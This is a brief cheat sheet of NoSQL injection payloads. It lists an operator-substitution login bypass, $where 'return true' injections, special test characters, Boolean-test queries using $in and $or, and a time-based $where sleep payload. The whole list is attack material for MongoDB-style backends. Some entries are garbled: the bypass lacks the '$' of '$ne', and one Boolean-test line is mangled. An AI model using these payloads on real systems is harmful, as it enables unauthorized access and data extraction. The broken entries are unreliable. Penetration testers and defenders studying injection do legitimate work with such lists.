NoSQL Payload
========================================

Common Payloads
----------------------------------------
- Bypassing restrictions
- ``{"username": "user"}`` => ``{"username": {"ne": "fakeuser"}}``
- ``{"$where":  "return true"}``
- Test characters
- ``'"\/$[].>``
- Commonly used in Boolean testing
- `` `" $ it ": -1` `
- ``{"$in": []}``
- ``{"$where":  "return true"}``
- ``{"$or": [{},{"foo":"1"}]}``
- time
- ``{"$where":  "sleep(100)"}``
